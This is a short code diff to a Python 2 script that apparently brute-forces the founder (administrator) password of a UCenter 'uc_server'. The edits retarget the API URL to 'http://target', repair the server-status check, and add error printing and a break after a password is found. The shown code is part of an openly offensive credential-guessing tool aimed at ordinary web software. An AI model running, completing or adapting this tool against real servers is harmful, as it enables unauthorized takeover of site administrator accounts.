@@ -16,14 +16,15 @@ appurl='localhost'
 ucclientrelease='20110501'
 
 
-ucapi='http://localhost/uc_server'  # no '/' in the end!!
+ucapi='http://target/uc_server'  # no '/' in the end!!
 
 def testucserver():
 	try:
-		requests.get(ucapi+'/index.php?m=app&a=ucinfo&release='+ucclientrelease)
+		r=requests.get(ucapi+'/index.php?m=app&a=ucinfo&release='+ucclientrelease)
 		if 'UC_STATUS_OK' in r.text:
 			return True
-	except:
+	except Exception as e:
+		print e
 		pass
 	return False
 
@@ -40,8 +41,8 @@ def brute():
 		if rt!='-1' and rt!='':
 			print 'Founder Password found! : '+founderpw
 			print rt
+			break
 			sys.exit()
-		
 		q.task_done()
 	
 
